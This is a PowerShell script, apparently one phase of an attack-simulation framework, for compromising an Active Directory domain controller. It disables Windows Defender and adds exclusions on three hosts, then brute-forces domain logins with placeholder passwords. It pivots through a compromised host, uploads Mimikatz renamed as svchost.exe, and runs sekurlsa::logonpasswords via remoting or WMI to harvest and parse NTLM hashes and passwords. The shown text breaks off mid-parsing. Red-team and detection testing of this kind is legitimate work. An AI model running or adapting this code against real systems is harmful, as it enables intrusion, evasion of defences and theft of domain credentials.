# ==================================================
# Phase3_AD_Compromise.ps1
# AD Server Compromise & Credential Theft (via vmjarvisfe)
# ==================================================

# Check initialization
if (-not $global:JARVIS_CONFIG) {
    Write-Host "Error: Run 00_Initialize.ps1 first" -ForegroundColor Red
    exit
}

# Check Phase 1 results
if (-not $global:discoveredHosts) {
    Write-Host "Error: Run Phase 1 first" -ForegroundColor Red
    exit
}

Write-Host "`n[PHASE 3] AD SERVER COMPROMISE & CREDENTIAL THEFT" -ForegroundColor Yellow
Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor Yellow

# Check vmjarvisfe session from Phase 2
$useVMPivot = $false
if ($global:vmjarvisfeSession -and $global:vmjarvisfeSession.State -eq 'Opened') {
    Write-Host "`n[*] Using Pivot host obtained from Phase 2" -ForegroundColor Cyan
    Write-Host "  Pivot: $($global:vmjarvisfeSession.ComputerName) (Session ID: $($global:vmjarvisfeSession.Id))" -ForegroundColor Gray
    $useVMPivot = $true
} else {
    Write-Host "`n[!] vmjarvisfe Pivot not obtained from Phase 2" -ForegroundColor Yellow
    Write-Host "  → Alternative: Execute attack directly from mjarvismaster" -ForegroundColor Yellow
}

# Disable Defender (local)
Write-Host "`n[*] Temporarily disabling Windows Defender..." -ForegroundColor Cyan
Write-Host "  [Local] Disabling mjarvismaster Defender..." -ForegroundColor Gray

# Completely disable Defender
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue

# Path and process exclusions
Add-MpPreference -ExclusionPath "C:\AtomicTest\Tools" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:\Windows\Temp" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "mimikatz.exe" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue

Write-Host "  ✓ Local Defender disabled successfully" -ForegroundColor Green

# Disable vmjarvisfe Defender (using Phase 2 session)
if ($global:vmjarvisfeSession -and $global:vmjarvisfeSession.State -eq 'Opened') {
    Write-Host "  [Remote] Disabling vmjarvisfe Defender..." -ForegroundColor Gray

    try {
        Invoke-Command -Session $global:vmjarvisfeSession -ScriptBlock {
            # Completely disable Defender
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue

            # Path and process exclusions
            Add-MpPreference -ExclusionPath "C:\Windows\Temp" -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess "mimikatz.exe" -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
        }
        Write-Host "  ✓ vmjarvisfe Defender disabled successfully" -ForegroundColor Green
    } catch {
        Write-Host "  ⚠ Failed to disable vmjarvisfe Defender: $($_.Exception.Message)" -ForegroundColor Yellow
    }
} else {
    Write-Host "  ⚠ No vmjarvisfe session, skipping Defender disable" -ForegroundColor Yellow
}

$dcHost = $global:discoveredHosts | Where-Object { $_.Type -eq "DomainController" -and $_.Reachable }

if (-not $dcHost) {
    Write-Host "✗ DC not found in Phase 1 - Aborting Phase 3" -ForegroundColor Red
    exit
}

$DCIP = $dcHost.IP
$DCName = $dcHost.Name
$Domain = $global:JARVIS_CONFIG.Domain

Write-Host "`n[*] Attack Path:" -ForegroundColor Gray
if ($useVMPivot) {
    Write-Host "  mjarvismaster → vmjarvisfe (Pivot) → $DCName ($DCIP)" -ForegroundColor Yellow
} else {
    Write-Host "  mjarvismaster → $DCName ($DCIP) [Direct Attack]" -ForegroundColor Yellow
}
Write-Host "[*] Domain: $Domain" -ForegroundColor Gray

# Step 3.1: Brute Force Attack
Write-Host "`n[Step 3.1] T1110.001 - Brute Force Attack..." -ForegroundColor Cyan

# Clean existing network connections (prevent multiple connections)
Write-Host "  [*] Cleaning existing network connections..." -ForegroundColor Gray
try {
    Get-PSDrive | Where-Object { $_.Name -like "DCTEST*" -or $_.Name -like "ADTEST*" } | Remove-PSDrive -Force -ErrorAction SilentlyContinue
    net use \\$DCIP\IPC$ /delete /y 2>&1 | Out-Null
    Write-Host "  ✓ Existing connections cleaned successfully" -ForegroundColor Green
} catch {
    # Ignore cleanup failures
}

if ($useVMPivot) {
    Write-Host "  [Attack Path] Via vmjarvisfe (Pivot)" -ForegroundColor Yellow
} else {
    Write-Host "  [Attack Path] Direct Attack" -ForegroundColor Yellow
}

$testCredentials = @(
    @{User="[TEST_USER_1]"; Password="[TEST_PASSWORD_1]"; Domain=$Domain; Type="Domain"},  # Priority 1
    @{User="[TEST_USER_2]"; Password="[TEST_PASSWORD_2]"; Domain=$Domain; Type="Domain"},  # Priority 2
    @{User="[TEST_USER_3]"; Password="[TEST_PASSWORD_2]"; Domain=$Domain; Type="Domain"},
    @{User="[TEST_USER_4]"; Password="[TEST_PASSWORD_2]"; Domain=$Domain; Type="Domain"},
    @{User="[TEST_USER_4]"; Password="[TEST_PASSWORD_1]"; Domain=$Domain; Type="Domain"}
)

# Add accounts discovered in Phase 1
if ($global:discoveredAccounts) {
    Write-Host "  [*] Extending brute force with accounts from Phase 1" -ForegroundColor Yellow

    $commonPasswords = @("[COMMON_PASSWORD_1]", "[COMMON_PASSWORD_2]", "[COMMON_PASSWORD_3]", "[COMMON_PASSWORD_4]", "[COMMON_PASSWORD_5]", "[COMMON_PASSWORD_6]")

    foreach ($account in $global:discoveredAccounts | Select-Object -First 10) {
        foreach ($pass in $commonPasswords) {
            $testCredentials += @{
                User = $account
                Password = $pass
                Domain = $Domain
                Type = "Domain"
            }
        }
    }
}

Write-Host "  Brute force attempt count: $($testCredentials.Count)" -ForegroundColor Gray

$validCredential = $null

if ($useVMPivot) {
    # Brute force via vmjarvisfe
    Write-Host "`n  [*] Executing brute force from Pivot host (vmjarvisfe)..." -ForegroundColor Cyan

    $bruteforceScript = {
        param($DCIP, $DCName, $Domain, $testCredentials, $logPath)

        $validCred = $null
        $attemptCount = 0

        foreach ($cred in $testCredentials) {
            $attemptCount++
            $username = if ($cred.Domain) { "$($cred.Domain)\$($cred.User)" } else { "$DCName\$($cred.User)" }

            Write-Host "    [$attemptCount/$($testCredentials.Count)] Attempt: $username" -ForegroundColor Gray
            Write-Host "      Password: $($cred.Password)" -ForegroundColor DarkGray
            Write-Host "      Target: \\$DCIP\C$" -ForegroundColor DarkGray

            $securePass = ConvertTo-SecureString $cred.Password -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential($username, $securePass)

            try {
                # Generate dynamic drive name (prevent collision)
                $driveName = "DCTEST_$($cred.User)_$(Get-Random -Maximum 9999)"
                $null = New-PSDrive -Name $driveName -PSProvider FileSystem -Root "\\$DCIP\C$" -Credential $credential -ErrorAction Stop
                Remove-PSDrive -Name $driveName -Force -ErrorAction SilentlyContinue

                $validCred = @{
                    Username = $username
                    Password = $cred.Password
                    Type = $cred.Type
                    IsDomainAdmin = ($cred.User -eq "[TEST_USER_1]" -or $cred.User -eq "[TEST_USER_4]")
                    Success = $true
                }

                Write-Host "      ✓ Success!" -ForegroundColor Green

                break

            } catch {
                $errorMsg = $_.Exception.Message
                if ($errorMsg -match "Access is denied|Logon failure") {
                    Write-Host "      ✗ Authentication failed" -ForegroundColor Red
                } elseif ($errorMsg -match "network path was not found|could not be found") {
                    Write-Host "      ✗ Network error (DC unreachable: $DCIP)" -ForegroundColor Red
                } else {
                    Write-Host "      ✗ Failed: $($errorMsg.Split("`n")[0])" -ForegroundColor Red
                }
            }

            Start-Sleep -Milliseconds 500
        }

        return $validCred
    }

    try {
        $result = Invoke-Command -Session $global:vmjarvisfeSession -ScriptBlock $bruteforceScript -ArgumentList $DCIP, $DCName, $Domain, $testCredentials, $global:logPath

        if ($result -and $result.Success) {
            Write-Host "  ✓ Brute force successful! (via vmjarvisfe)" -ForegroundColor Green
            Write-Host "    Credentials: $($result.Username) / $($result.Password)" -ForegroundColor Red

            $securePass = ConvertTo-SecureString $result.Password -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential($result.Username, $securePass)

            $validCredential = @{
                Username = $result.Username
                Password = $result.Password
                Credential = $credential
                Type = $result.Type
                IsDomainAdmin = $result.IsDomainAdmin
                ViaVMPivot = $true
            }

            $global:validCredentials += $validCredential
            $validCredential | ConvertTo-Json | Out-File "$global:logPath\phase3_bruteforce_success.json"
        }
    } catch {
        Write-Host "  ✗ Brute force failed via Pivot: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    # Direct brute force
    Write-Host "`n  [*] Executing direct brute force from mjarvismaster..." -ForegroundColor Cyan

    $attemptCount = 0
    foreach ($cred in $testCredentials) {
        $attemptCount++
        $username = if ($cred.Domain) { "$($cred.Domain)\$($cred.User)" } else { "$DCName\$($cred.User)" }

        Write-Host "  [$attemptCount/$($testCredentials.Count)] Attempt: $username" -ForegroundColor Gray
        Write-Host "    Password: $($cred.Password)" -ForegroundColor DarkGray
        Write-Host "    Target: \\$DCIP\C$" -ForegroundColor DarkGray

        $securePass = ConvertTo-SecureString $cred.Password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($username, $securePass)

        try {
            # Generate dynamic drive name (prevent collision)
            $driveName = "DCTEST_$($cred.User)_$(Get-Random -Maximum 9999)"
            $null = New-PSDrive -Name $driveName -PSProvider FileSystem -Root "\\$DCIP\C$" -Credential $credential -ErrorAction Stop
            Remove-PSDrive -Name $driveName -Force -ErrorAction SilentlyContinue

            Write-Host "`n  ✓ Brute force successful!" -ForegroundColor Green
            Write-Host "    Credentials: $username / $($cred.Password)" -ForegroundColor Red

            $validCredential = @{
                Username = $username
                Password = $cred.Password
                Credential = $credential
                Type = $cred.Type
                IsDomainAdmin = ($cred.User -eq "[TEST_USER_1]" -or $cred.User -eq "[TEST_USER_4]")
                ViaVMPivot = $false
            }

            $global:validCredentials += $validCredential
            $validCredential | ConvertTo-Json | Out-File "$global:logPath\phase3_bruteforce_success.json"

            break

        } catch {
            $errorMsg = $_.Exception.Message
            if ($errorMsg -match "Access is denied|Logon failure") {
                Write-Host "    ✗ Authentication failed (invalid credentials)" -ForegroundColor Red
            } elseif ($errorMsg -match "network path was not found|could not be found") {
                Write-Host "    ✗ Network error (DC unreachable: $DCIP)" -ForegroundColor Red
            } else {
                Write-Host "    ✗ Failed: $($errorMsg.Split("`n")[0])" -ForegroundColor Red
            }
        }

        Start-Sleep -Milliseconds 500
    }
}

if (-not $validCredential) {
    Write-Host "`n  ✗ All brute force attempts failed" -ForegroundColor Red
    Write-Host "  ⚠ Phase 3 completed with limitations: Credential acquisition failed" -ForegroundColor Yellow
    Write-Host "  Recommendation: Create the following accounts on AD server:" -ForegroundColor Yellow
    Write-Host "    - [TEST_USER_1] / [TEST_PASSWORD_1] (Domain Admin)" -ForegroundColor Gray
    Write-Host "    - [TEST_USER_3] / [TEST_PASSWORD_2] (Domain User)" -ForegroundColor Gray
    Write-Host "    - [TEST_USER_4] / [TEST_PASSWORD_2]" -ForegroundColor Gray

    # Do not exit even if credential acquisition fails - Phase 4 can proceed
    Write-Host "`n  → Phase 4 can proceed with Fallback mechanism" -ForegroundColor Cyan
    return
}

# Step 3.2: Establish Remote Session
Write-Host "`n[Step 3.2] Establishing AD server remote session..." -ForegroundColor Cyan

$session = $null

if ($useVMPivot) {
    Write-Host "  [Method] Via vmjarvisfe Pivot" -ForegroundColor Yellow

    $sessionScript = {
        param($DCIP, $username, $password)

        $securePass = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($username, $securePass)

        try {
            # Configure TrustedHosts
            $currentTrusted = (Get-Item WSMan:\localhost\Client\TrustedHosts -ErrorAction SilentlyContinue).Value
            if ($currentTrusted -notlike "*$DCIP*") {
                Set-Item WSMan:\localhost\Client\TrustedHosts -Value $DCIP -Force -ErrorAction SilentlyContinue
            }

            $dcSession = New-PSSession -ComputerName $DCIP -Credential $credential -ErrorAction Stop

            return @{
                Success = $true
                SessionID = $dcSession.Id
                ComputerName = $dcSession.ComputerName
                State = $dcSession.State
            }

        } catch {
            return @{
                Success = $false
                Error = $_.Exception.Message
            }
        }
    }

    try {
        $sessionResult = Invoke-Command -Session $global:vmjarvisfeSession -ScriptBlock $sessionScript -ArgumentList $DCIP, $validCredential.Username, $validCredential.Password

        if ($sessionResult.Success) {
            Write-Host "  ✓ AD server session established successfully (via vmjarvisfe)" -ForegroundColor Green
            Write-Host "    Session ID: $($sessionResult.SessionID)" -ForegroundColor Gray
            $session = $sessionResult
        } else {
            Write-Host "  ✗ Session establishment failed: $($sessionResult.Error)" -ForegroundColor Red
        }
    } catch {
        Write-Host "  ✗ Session establishment failed via Pivot: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "  [Method] Direct Connection" -ForegroundColor Yellow

    try {
        $session = New-PSSession -ComputerName $DCIP -Credential $validCredential.Credential -ErrorAction Stop
        Write-Host "  ✓ Remote session established successfully (Session ID: $($session.Id))" -ForegroundColor Green

    } catch {
        Write-Host "  ⚠ WinRM session failed: $($_.Exception.Message)" -ForegroundColor Yellow
        Write-Host "  → Switching to WMI-based attack" -ForegroundColor Yellow
    }
}

# Disable AD Server Defender
Write-Host "`n[Step 3.2-1] Disabling AD server Defender..." -ForegroundColor Cyan

if ($useVMPivot) {
    # Disable AD Defender via vmjarvisfe
    Write-Host "  [Method] Via vmjarvisfe" -ForegroundColor Yellow

    try {
        $defenderScript = {
            param($DCIP, $username, $password)

            $securePass = ConvertTo-SecureString $password -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential($username, $securePass)

            try {
                # Create session to AD
                $adSession = Get-PSSession | Where-Object {$_.ComputerName -eq $DCIP -and $_.State -eq 'Opened'} | Select-Object -First 1

                if (-not $adSession) {
                    $adSession = New-PSSession -ComputerName $DCIP -Credential $credential -ErrorAction Stop
                }

                # Completely disable Defender
                Invoke-Command -Session $adSession -ScriptBlock {
                    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
                    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
                    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
                    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue

                    Add-MpPreference -ExclusionPath "C:\Windows\Temp" -ErrorAction SilentlyContinue
                    Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction SilentlyContinue
                    Add-MpPreference -ExclusionProcess "mimikatz.exe" -ErrorAction SilentlyContinue
                    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
                }

                return @{Success = $true; SessionID = $adSession.Id}

            } catch {
                return @{Success = $false; Error = $_.Exception.Message}
            }
        }

        $defenderResult = Invoke-Command -Session $global:vmjarvisfeSession -ScriptBlock $defenderScript `
                                         -ArgumentList $DCIP, $validCredential.Username, $validCredential.Password

        if ($defenderResult.Success) {
            Write-Host "  ✓ AD server Defender disabled successfully (via vmjarvisfe)" -ForegroundColor Green
        } else {
            Write-Host "  ⚠ Failed to disable AD Defender: $($defenderResult.Error)" -ForegroundColor Yellow
        }

    } catch {
        Write-Host "  ⚠ Failed to disable Defender via Pivot: $($_.Exception.Message)" -ForegroundColor Yellow
    }

} elseif ($session -and ($session.GetType().Name -eq 'PSSession') -and $session.State -eq 'Opened') {
    # Disable AD Defender via direct connection
    Write-Host "  [Method] Direct Connection" -ForegroundColor Yellow

    try {
        Invoke-Command -Session $session -ScriptBlock {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue

            Add-MpPreference -ExclusionPath "C:\Windows\Temp" -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess "mimikatz.exe" -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
        }
        Write-Host "  ✓ AD server Defender disabled successfully" -ForegroundColor Green

    } catch {
        Write-Host "  ⚠ Failed to disable AD Defender: $($_.Exception.Message)" -ForegroundColor Yellow
    }
} else {
    Write-Host "  ⚠ No AD session, skipping Defender disable" -ForegroundColor Yellow
    Write-Host "  → Defender detection possible during Mimikatz upload" -ForegroundColor Yellow
}

# Step 3.3: Upload Mimikatz
Write-Host "`n[Step 3.3] Uploading Mimikatz..." -ForegroundColor Cyan

$localMimikatz = "C:\AtomicTest\Tools\mimikatz.exe"
$remoteMimikatz = "\\$DCIP\C$\Windows\Temp\svchost.exe"

if (-not (Test-Path $localMimikatz)) {
    Write-Host "  ✗ Local Mimikatz not found: $localMimikatz" -ForegroundColor Red
    exit
}

if ($useVMPivot) {
    Write-Host "  [Method] Upload via vmjarvisfe" -ForegroundColor Yellow

    try {
        # Stage 1: Transfer Mimikatz from mjarvismaster → vmjarvisfe
        Write-Host "    [1/2] Transferring mjarvismaster → vmjarvisfe..." -ForegroundColor Gray
        Write-Host "      Using credentials: $($global:vmjarvisfeCredential.Username)" -ForegroundColor DarkGray

        $VMIP = $global:JARVIS_CONFIG.TargetVM_IP

        # Use vmjarvisfe credentials obtained from Phase 2
        if ($global:vmjarvisfeCredential -and $global:vmjarvisfeCredential.Credential) {
            # Map network drive with New-PSDrive (Copy-Item cannot use -Credential directly with UNC)
            $driveName = "VMTEMP"
            Write-Host "      Method: New-PSDrive mapping (Drive: $driveName)" -ForegroundColor DarkGray

            try {
                $null = New-PSDrive -Name $driveName -PSProvider FileSystem -Root "\\$VMIP\C$" `
                                    -Credential $global:vmjarvisfeCredential.Credential -ErrorAction Stop

                Copy-Item -Path $localMimikatz -Destination "${driveName}:\Windows\Temp\svchost.exe" -Force -ErrorAction Stop

                Remove-PSDrive -Name $driveName -Force -ErrorAction SilentlyContinue

                Write-Host "    ✓ vmjarvisfe transfer completed (New-PSDrive method)" -ForegroundColor Green

            } catch {
                # Fallback on PSDrive failure: Use PowerShell Remoting session
                Write-Host "      ⚠ New-PSDrive failed, switching to PowerShell Remoting session" -ForegroundColor Yellow

                if ($global:vmjarvisfeSession -and $global:vmjarvisfeSession.State -eq 'Opened') {
                    # Encode file as Base64 and transfer via remote session
                    $fileBytes = [System.IO.File]::ReadAllBytes($localMimikatz)
                    $fileBase64 = [Convert]::ToBase64String($fileBytes)

                    Invoke-Command -Session $global:vmjarvisfeSession -ScriptBlock {
                        param($base64Content, $destPath)
                        $bytes = [Convert]::FromBase64String($base64Content)
                        [System.IO.File]::WriteAllBytes($destPath, $bytes)
                    } -ArgumentList $fileBase64, "C:\Windows\Temp\svchost.exe"

                    Write-Host "    ✓ vmjarvisfe transfer completed (PSRemoting method)" -ForegroundColor Green
                } else {
                    throw "PowerShell Remoting session not available"
                }
            }

        } else {
            # Fallback: Try with current context
            Write-Host "      Method: Current context (no credentials)" -ForegroundColor DarkGray
            $vmMimikatzPath = "\\$VMIP\C$\Windows\Temp\svchost.exe"
            Copy-Item -Path $localMimikatz -Destination $vmMimikatzPath -Force -ErrorAction Stop
            Write-Host "    ✓ vmjarvisfe transfer completed (current context)" -ForegroundColor Green
        }

        # Stage 2: Transfer Mimikatz from vmjarvisfe → AD server
        Write-Host "    [2/2] Transferring vmjarvisfe → AD server..." -ForegroundColor Gray
        Write-Host "      Using credentials: $($validCredential.Username)" -ForegroundColor DarkGray
        Write-Host "      Method: PowerShell Remoting session" -ForegroundColor DarkGray

        # Transfer via remote session from vmjarvisfe (CredSSP or in-session transfer)
        $uploadScript = {
            param($DCIP, $username, $password)

            $source = "C:\Windows\Temp\svchost.exe"
            $dest = "\\$DCIP\C$\Windows\Temp\svchost.exe"

            Write-Host "      Source: $source" -ForegroundColor DarkGray
            Write-Host "      Dest: $dest" -ForegroundColor DarkGray

            $securePass = ConvertTo-SecureString $password -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential($username, $securePass)

            try {
                # Method 1: Map with New-PSDrive then Copy-Item
                try {
                    $driveName = "ADTEMP"
                    New-PSDrive -Name $driveName -PSProvider FileSystem -Root "\\$DCIP\C$" -Credential $credential -ErrorAction Stop | Out-Null
                    Copy-Item -Path $source -Destination "${driveName}:\Windows\Temp\svchost.exe" -Force -ErrorAction Stop
                    Remove-PSDrive -Name $driveName -Force -ErrorAction SilentlyContinue

                    Write-Host "      ✓ New-PSDrive method successful" -ForegroundColor Green
                    return @{Success = $true; Method = "PSDrive"}

                } catch {
                    Write-Host "      ⚠ New-PSDrive failed: $($_.Exception.Message)" -ForegroundColor Yellow

                    # Method 2: Create session to AD with PowerShell Remoting then transfer
                    try {
                        $adSession = New-PSSession -ComputerName $DCIP -Credential $credential -ErrorAction Stop

                        # Encode file content as Base64 and transfer
                        $fileBytes = [System.IO.File]::ReadAllBytes($source)
                        $fileBase64 = [Convert]::ToBase64String($fileBytes)

                        Invoke-Command -Session $adSession -ScriptBlock {
                            param($base64Content, $destPath)
                            $bytes = [Convert]::FromBase64String($base64Content)
                            [System.IO.File]::WriteAllBytes($destPath, $bytes)
                        } -ArgumentList $fileBase64, "C:\Windows\Temp\svchost.exe"

                        Remove-PSSession -Session $adSession -ErrorAction SilentlyContinue

                        Write-Host "      ✓ PowerShell Remoting method successful" -ForegroundColor Green
                        return @{Success = $true; Method = "PSRemoting"}

                    } catch {
                        throw "PowerShell Remoting failed: $($_.Exception.Message)"
                    }
                }

            } catch {
                return @{Success = $false; Error = $_.Exception.Message}
            }
        }

        $uploadResult = Invoke-Command -Session $global:vmjarvisfeSession -ScriptBlock $uploadScript -ArgumentList $DCIP, $validCredential.Username, $validCredential.Password

        if ($uploadResult.Success) {
            Write-Host "  ✓ Mimikatz upload completed (via vmjarvisfe, Method: $($uploadResult.Method))" -ForegroundColor Green
        } else {
            Write-Host "  ✗ vmjarvisfe → AD transfer failed: $($uploadResult.Error)" -ForegroundColor Red
            Write-Host "  [Debug] Checklist:" -ForegroundColor Yellow
            Write-Host "    - AD credentials: $($validCredential.Username)" -ForegroundColor Gray
            Write-Host "    - AD IP: $DCIP" -ForegroundColor Gray
            Write-Host "    - Check network connection from vmjarvisfe to AD" -ForegroundColor Gray
            exit
        }

    } catch {
        Write-Host "  ✗ Upload failed via Pivot: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "  [Debug] Stage 1 (mjarvismaster→vmjarvisfe) may have failed" -ForegroundColor Yellow
        Write-Host "    - vmjarvisfe credentials: $($global:vmjarvisfeCredential.Username)" -ForegroundColor Gray
        Write-Host "    - vmjarvisfe IP: $($global:JARVIS_CONFIG.TargetVM_IP)" -ForegroundColor Gray
        exit
    }
} else {
    Write-Host "  [Method] Direct Upload" -ForegroundColor Yellow

    try {
        Copy-Item -Path $localMimikatz -Destination $remoteMimikatz -Force
        Write-Host "  ✓ Mimikatz upload completed" -ForegroundColor Green

    } catch {
        Write-Host "  ✗ Upload failed: $($_.Exception.Message)" -ForegroundColor Red
        exit
    }
}

# Step 3.4: Execute Mimikatz Remotely
Write-Host "`n[Step 3.4] Executing Mimikatz remotely on AD server..." -ForegroundColor Cyan

$mimikatzOutput = ""

if ($useVMPivot) {
    Write-Host "  [Method] Via vmjarvisfe Pivot" -ForegroundColor Yellow

    $mimikatzScript = {
        param($DCIP, $username, $password)

        $securePass = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($username, $securePass)

        try {
            # Create session to AD server
            $dcSession = Get-PSSession | Where-Object {$_.ComputerName -eq $DCIP -and $_.State -eq 'Opened'} | Select-Object -First 1

            if (-not $dcSession) {
                $dcSession = New-PSSession -ComputerName $DCIP -Credential $credential -ErrorAction Stop
            }

            # Execute Mimikatz
            $output = Invoke-Command -Session $dcSession -ScriptBlock {
                $commands = @"
privilege::debug
log C:\Windows\Temp\mimi_output.txt
sekurlsa::logonpasswords
exit
"@

                $commandFile = "C:\Windows\Temp\mimi_commands.txt"
                $commands | Out-File $commandFile -Encoding ASCII

                $result = & C:\Windows\Temp\svchost.exe $commandFile 2>&1 | Out-String

                return $result
            }

            Remove-PSSession -Session $dcSession -ErrorAction SilentlyContinue

            return @{
                Success = $true
                Output = $output
            }

        } catch {
            return @{
                Success = $false
                Error = $_.Exception.Message
            }
        }
    }

    try {
        $mimiResult = Invoke-Command -Session $global:vmjarvisfeSession -ScriptBlock $mimikatzScript -ArgumentList $DCIP, $validCredential.Username, $validCredential.Password

        if ($mimiResult.Success) {
            Write-Host "  ✓ Mimikatz execution completed (via vmjarvisfe)" -ForegroundColor Green
            $mimikatzOutput = $mimiResult.Output
        } else {
            Write-Host "  ✗ Execution failed: $($mimiResult.Error)" -ForegroundColor Red

            # Alternative: Try WMI
            Write-Host "`n  [Alternative] WMI Process Creation (via vmjarvisfe)..." -ForegroundColor Yellow

            $wmiScript = {
                param($DCIP)

                $commands = @"
privilege::debug
log C:\Windows\Temp\mimi_output.txt
sekurlsa::logonpasswords
exit
"@

                $commands | Out-File "C:\Windows\Temp\mimi_commands.txt" -Encoding ASCII

                try {
                    Copy-Item -Path "C:\Windows\Temp\mimi_commands.txt" -Destination "\\$DCIP\C$\Windows\Temp\" -Force

                    $process = ([wmiclass]"\\$DCIP\root\cimv2:Win32_Process").Create("C:\Windows\Temp\svchost.exe C:\Windows\Temp\mimi_commands.txt")

                    if ($process.ReturnValue -eq 0) {
                        Start-Sleep -Seconds 10

                        $outputPath = "\\$DCIP\C$\Windows\Temp\mimi_output.txt"
                        if (Test-Path $outputPath) {
                            $output = Get-Content $outputPath -Raw
                            return @{Success = $true; Output = $output; PID = $process.ProcessId}
                        }
                    }

                    return @{Success = $false; Error = "WMI execution failed"}
                } catch {
                    return @{Success = $false; Error = $_.Exception.Message}
                }
            }

            $wmiResult = Invoke-Command -Session $global:vmjarvisfeSession -ScriptBlock $wmiScript -ArgumentList $DCIP

            if ($wmiResult.Success) {
                Write-Host "  ✓ Mimikatz executed via WMI (PID: $($wmiResult.PID))" -ForegroundColor Green
                $mimikatzOutput = $wmiResult.Output
            }
        }

    } catch {
        Write-Host "  ✗ Execution failed via Pivot: $($_.Exception.Message)" -ForegroundColor Red
    }

} elseif ($session -and $session.State -eq 'Opened') {
    Write-Host "  [Method] PowerShell Remoting (Direct)" -ForegroundColor Gray

    $mimikatzScript = {
        $commands = @"
privilege::debug
log C:\Windows\Temp\mimi_output.txt
sekurlsa::logonpasswords
exit
"@

        $commandFile = "C:\Windows\Temp\mimi_commands.txt"
        $commands | Out-File $commandFile -Encoding ASCII

        $output = & C:\Windows\Temp\svchost.exe $commandFile 2>&1 | Out-String

        return $output
    }

    try {
        $mimikatzOutput = Invoke-Command -Session $session -ScriptBlock $mimikatzScript
        Write-Host "  ✓ Mimikatz execution completed" -ForegroundColor Green

    } catch {
        Write-Host "  ✗ Execution failed: $($_.Exception.Message)" -ForegroundColor Red
    }

} else {
    Write-Host "  [Method] WMI Process Creation (Direct)" -ForegroundColor Gray

    try {
        $commands = @"
privilege::debug
log C:\Windows\Temp\mimi_output.txt
sekurlsa::logonpasswords
exit
"@

        $commands | Out-File "$env:TEMP\mimi_commands.txt" -Encoding ASCII
        Copy-Item -Path "$env:TEMP\mimi_commands.txt" -Destination "\\$DCIP\C$\Windows\Temp\" -Force

        $process = ([wmiclass]"\\$DCIP\root\cimv2:Win32_Process").Create(
            "C:\Windows\Temp\svchost.exe C:\Windows\Temp\mimi_commands.txt"
        )

        if ($process.ReturnValue -eq 0) {
            Write-Host "  ✓ Mimikatz executed via WMI (PID: $($process.ProcessId))" -ForegroundColor Green

            Start-Sleep -Seconds 10

            Copy-Item -Path "\\$DCIP\C$\Windows\Temp\mimi_output.txt" -Destination "$global:logPath\ad_mimikatz_output.txt" -ErrorAction SilentlyContinue

            if (Test-Path "$global:logPath\ad_mimikatz_output.txt") {
                $mimikatzOutput = Get-Content "$global:logPath\ad_mimikatz_output.txt" -Raw
            }
        }

    } catch {
        Write-Host "  ✗ WMI execution failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Save output
if ($mimikatzOutput) {
    $mimikatzOutput | Out-File "$global:logPath\ad_mimikatz_full_output.txt"

    Write-Host "`n  [Mimikatz Output Preview]" -ForegroundColor Cyan
    $mimikatzOutput -split "`n" | Select-Object -First 60 | ForEach-Object {
        if ($_ -match "privilege|Username|Domain|NTLM|Password") {
            Write-Host "  $_" -ForegroundColor DarkCyan
        }
    }
}

# Step 3.5: Parse Credentials
Write-Host "`n[Step 3.5] Parsing credentials..." -ForegroundColor Cyan

if ($mimikatzOutput) {
    $credentialBlocks = $mimikatzOutput -split "Authentication Id :" | Where-Object { $_ -match "Username" }

    foreach ($block in $credentialBlocks) {
        $usernameMatch = [regex]::Match($block, 'Username\s*:\s*(\S+)')
        $domainMatch = [regex]::Match($block, 'Domain\s*:\s*(\S+)')
        $ntlmMatch = [regex]::Match($block, '\*\s*NTLM\s*:\s*([0-9a-fA-F]{32})')
        $passwordMatch = [regex]::Match($block, '\*\s*Password\s*:\s*(.+?)(?:\r?\n|$)')

        if ($usernameMatch.Success -and $ntlmMatch.Success) {
